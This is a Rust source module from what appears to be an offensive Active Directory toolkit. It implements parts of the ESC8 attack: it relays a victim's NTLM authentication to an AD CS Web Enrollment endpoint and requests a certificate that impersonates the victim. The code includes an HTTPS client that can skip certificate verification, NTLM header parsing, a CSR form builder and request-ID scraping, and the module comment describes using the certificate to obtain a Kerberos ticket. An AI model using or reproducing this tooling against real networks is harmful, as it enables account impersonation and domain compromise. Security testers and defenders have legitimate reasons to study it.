//! ESC8 — NTLM-over-HTTP relay to AD CS Web Enrollment.
//!
//! Given a victim's SMB NTLM (received via `smb2_client::server::RelayConn`), forward the
//! Type1/Type3 messages to the CA's `/certsrv` HTTP endpoint, submit a fresh CSR through the
//! authenticated channel, and download the issued certificate. The attacker then holds a
//! certificate whose subject/UPN authenticates as the victim — feed it to `attack abuse
//! --action pkinit` to obtain a TGT.
//!
//! **Validation status.** The wire pieces (HTTP/1.1 request builder, response parser,
//! NTLM-in-headers, form POST, ReqID scrape) are unit-tested. The end-to-end relay is
//! matrix-owed — it needs a live AD CS role with Web Enrollment installed.

use anyhow::{anyhow, Context, Result};
use rustls::client::ServerCertVerified;
use rustls::{Certificate, ClientConfig, RootCertStore, ServerName};
use std::io::Write;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

// ----- HTTP/1.1 minimal client with keep-alive -----------------------------------------------

pub struct HttpsClient {
    stream: tokio_rustls::client::TlsStream<TcpStream>,
    host: String,
}

/// Skip TLS cert verification — AD CS often runs on a self-signed / internal-CA endpoint.
struct AcceptAny;
impl rustls::client::ServerCertVerifier for AcceptAny {
    fn verify_server_cert(
        &self,
        _end_entity: &Certificate,
        _intermediates: &[Certificate],
        _server_name: &ServerName,
        _scts: &mut dyn Iterator<Item = &[u8]>,
        _ocsp_response: &[u8],
        _now: std::time::SystemTime,
    ) -> std::result::Result<ServerCertVerified, rustls::Error> {
        Ok(ServerCertVerified::assertion())
    }
}

impl HttpsClient {
    pub async fn connect(host: &str, port: u16, insecure: bool) -> Result<Self> {
        let cfg = if insecure {
            ClientConfig::builder()
                .with_safe_defaults()
                .with_custom_certificate_verifier(Arc::new(AcceptAny))
                .with_no_client_auth()
        } else {
            let mut roots = RootCertStore::empty();
            for c in rustls_native_certs::load_native_certs()? {
                let _ = roots.add(&Certificate(c.0));
            }
            ClientConfig::builder()
                .with_safe_defaults()
                .with_root_certificates(roots)
                .with_no_client_auth()
        };
        let connector = tokio_rustls::TlsConnector::from(Arc::new(cfg));
        let tcp = TcpStream::connect((host, port)).await?;
        let sn = ServerName::try_from(host).context("bad host name for TLS SNI")?;
        let stream = connector.connect(sn, tcp).await?;
        Ok(HttpsClient {
            stream,
            host: host.to_string(),
        })
    }

    /// Send a single HTTP/1.1 request on the persistent connection and read the full response.
    pub async fn send(
        &mut self,
        method: &str,
        path: &str,
        headers: &[(&str, &str)],
        body: &[u8],
    ) -> Result<HttpResponse> {
        let mut req: Vec<u8> = Vec::with_capacity(body.len() + 512);
        write!(&mut req, "{method} {path} HTTP/1.1\r\n")?;
        write!(&mut req, "Host: {}\r\n", self.host)?;
        write!(&mut req, "Connection: keep-alive\r\n")?;
        write!(&mut req, "Content-Length: {}\r\n", body.len())?;
        for (k, v) in headers {
            write!(&mut req, "{k}: {v}\r\n")?;
        }
        req.extend_from_slice(b"\r\n");
        req.extend_from_slice(body);
        self.stream.write_all(&req).await?;
        self.stream.flush().await?;
        read_response(&mut self.stream).await
    }
}

pub struct HttpResponse {
    pub status: u16,
    pub headers: Vec<(String, String)>,
    pub body: Vec<u8>,
}

impl HttpResponse {
    pub fn header(&self, name: &str) -> Option<&str> {
        self.headers
            .iter()
            .find(|(k, _)| k.eq_ignore_ascii_case(name))
            .map(|(_, v)| v.as_str())
    }
}

/// Read one HTTP/1.1 response from the stream: status line + headers (delimited by `\r\n\r\n`),
/// then body per `Content-Length`. Chunked transfer-encoding not implemented — AD CS certsrv
/// uses fixed lengths in every response the ESC8 flow touches.
async fn read_response<R: AsyncReadExt + Unpin>(r: &mut R) -> Result<HttpResponse> {
    let mut buf = Vec::with_capacity(4096);
    let mut chunk = [0u8; 4096];
    // Read until we see \r\n\r\n.
    let header_end = loop {
        let n = r.read(&mut chunk).await?;
        if n == 0 {
            return Err(anyhow!("connection closed before headers"));
        }
        buf.extend_from_slice(&chunk[..n]);
        if let Some(pos) = find_header_end(&buf) {
            break pos;
        }
        if buf.len() > 64 * 1024 {
            return Err(anyhow!("HTTP headers > 64KiB — aborting"));
        }
    };
    let (head, tail_after) = buf.split_at(header_end);
    let head_str = std::str::from_utf8(head).context("non-UTF8 HTTP headers")?;
    let (status, headers) = parse_head(head_str)?;
    let mut body = tail_after[4..].to_vec(); // skip the \r\n\r\n
    let content_len: usize = headers
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case("Content-Length"))
        .and_then(|(_, v)| v.parse().ok())
        .unwrap_or(0);
    while body.len() < content_len {
        let n = r.read(&mut chunk).await?;
        if n == 0 {
            break;
        }
        body.extend_from_slice(&chunk[..n]);
    }
    body.truncate(content_len);
    Ok(HttpResponse {
        status,
        headers,
        body,
    })
}

fn find_header_end(buf: &[u8]) -> Option<usize> {
    buf.windows(4).position(|w| w == b"\r\n\r\n")
}

fn parse_head(s: &str) -> Result<(u16, Vec<(String, String)>)> {
    let mut lines = s.split("\r\n");
    let status_line = lines.next().context("empty response")?;
    // "HTTP/1.1 200 OK"
    let status: u16 = status_line
        .split_whitespace()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .context("bad status line")?;
    let mut headers = Vec::new();
    for l in lines {
        if l.is_empty() {
            break;
        }
        if let Some((k, v)) = l.split_once(':') {
            headers.push((k.trim().to_string(), v.trim().to_string()));
        }
    }
    Ok((status, headers))
}

// ----- ESC8 flow -----------------------------------------------------------------------------

/// Extract the NTLM Type-2 (base64) from a `WWW-Authenticate: NTLM <b64>` header.
pub fn parse_ntlm_challenge(www_auth: &str) -> Option<Vec<u8>> {
    // The header value may list multiple schemes; find the NTLM entry.
    for entry in www_auth.split(',') {
        let e = entry.trim();
        if let Some(rest) = e.strip_prefix("NTLM ") {
            return base64_decode(rest.trim());
        }
    }
    None
}

/// Extract the certificate Request ID from the ASP response HTML. AD CS emits
/// `ReqID=<n>` in a `location.href="certnew.cer?ReqID=..."` line or similar.
pub fn parse_request_id(html: &str) -> Option<u32> {
    let key = "ReqID=";
    let at = html.find(key)?;
    let tail = &html[at + key.len()..];
    let end = tail
        .find(|c: char| !c.is_ascii_digit())
        .unwrap_or(tail.len());
    tail[..end].parse().ok()
}

/// Build the form-encoded body AD CS Web Enrollment expects.
/// `csr_pem` is the PEM-armored PKCS#10.
pub fn cert_request_form(csr_pem: &str, template: &str) -> String {
    let attrs = format!("CertificateTemplate:{template}");
    // AD CS decodes these on the server side; the encoded CSR must include newlines.
    let mut out = String::new();
    out.push_str("Mode=newreq");
    out.push_str("&CertRequest=");
    out.push_str(&url_encode(csr_pem));
    out.push_str("&CertAttrib=");
    out.push_str(&url_encode(&attrs));
    out.push_str("&TargetStoreFlags=0");
    out.push_str("&SaveCert=yes");
    out.push_str("&ThumbPrint=");
    out
}

/// application/x-www-form-urlencoded encoder — the small alphabet AD CS's ASP handler cares about.
fn url_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            b' ' => out.push('+'),
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

// ----- tiny base64 (avoid pulling a whole crate for this one thing) --------------------------

const B64: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

pub fn base64_encode(b: &[u8]) -> String {
    let mut out = String::with_capacity(b.len().div_ceil(3) * 4);
    for chunk in b.chunks(3) {
        let (a, b1, c) = (
            chunk[0] as u32,
            chunk.get(1).copied().unwrap_or(0) as u32,
            chunk.get(2).copied().unwrap_or(0) as u32,
        );
        let n = (a << 16) | (b1 << 8) | c;
        out.push(B64[((n >> 18) & 0x3f) as usize] as char);
        out.push(B64[((n >> 12) & 0x3f) as usize] as char);
        out.push(if chunk.len() > 1 {
            B64[((n >> 6) & 0x3f) as usize] as char
        } else {
            '='
        });
        out.push(if chunk.len() > 2 {
            B64[(n & 0x3f) as usize] as char
        } else {
            '='
        });
    }
    out
}

pub fn base64_decode(s: &str) -> Option<Vec<u8>> {
    let s: Vec<u8> = s.bytes().filter(|b| !b.is_ascii_whitespace()).collect();
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let idx = |c: u8| -> Option<u32> {
        match c {
            b'A'..=b'Z' => Some((c - b'A') as u32),
            b'a'..=b'z' => Some((c - b'a' + 26) as u32),
            b'0'..=b'9' => Some((c - b'0' + 52) as u32),
            b'+' => Some(62),
            b'/' => Some(63),
            _ => None,
        }
    };
    for chunk in s.chunks(4) {
        if chunk.len() < 2 {
            return None;
        }
        let a = idx(chunk[0])?;
        let b = idx(chunk[1])?;
        let c = if chunk.len() > 2 && chunk[2] != b'=' {
            Some(idx(chunk[2])?)
        } else {
            None
        };
        let d = if chunk.len() > 3 && chunk[3] != b'=' {
            Some(idx(chunk[3])?)
        } else {
            None
        };
        let n = (a << 18) | (b << 12) | (c.unwrap_or(0) << 6) | d.unwrap_or(0);
        out.push((n >> 16) as u8);
        if c.is_some() {
            out.push((n >> 8) as u8);
        }
        if d.is_some() {
            out.push(n as u8);
        }
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn base64_roundtrip_including_pad() {
        for msg in [b"".as_slice(), b"a", b"ab", b"abc", b"abcdef", &[0, 1, 255]] {
            assert_eq!(base64_decode(&base64_encode(msg)).unwrap(), msg);
        }
    }

    #[test]
    fn ntlm_challenge_extracted_from_www_authenticate() {
        let hdr = "Negotiate, NTLM TlRMTVNTUAACAAAA";
        let t2 = parse_ntlm_challenge(hdr).unwrap();
        assert_eq!(&t2[..8], b"NTLMSSP\0"); // first 8 bytes of an NTLM Type-2 message
    }

    #[test]
    fn request_id_scraped_from_asp_response() {
        let html = r#"<script>location.href="certnew.cer?ReqID=42&Enc=b64"</script>"#;
        assert_eq!(parse_request_id(html), Some(42));
    }

    #[test]
    fn form_encodes_csr_pem_and_template() {
        let form = cert_request_form("-----BEGIN CERTIFICATE REQUEST-----\nabc\n", "User");
        assert!(form.starts_with("Mode=newreq"));
        assert!(form.contains("CertRequest="));
        assert!(form.contains("CertificateTemplate%3AUser"));
    }

    #[test]
    fn parse_head_extracts_status_and_headers() {
        let s = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM abc\r\nContent-Length: 0\r\n";
        let (st, hs) = parse_head(s).unwrap();
        assert_eq!(st, 401);
        assert_eq!(hs.len(), 2);
        assert!(hs.iter().any(|(k, v)| k == "WWW-Authenticate" && v == "NTLM abc"));
    }
}
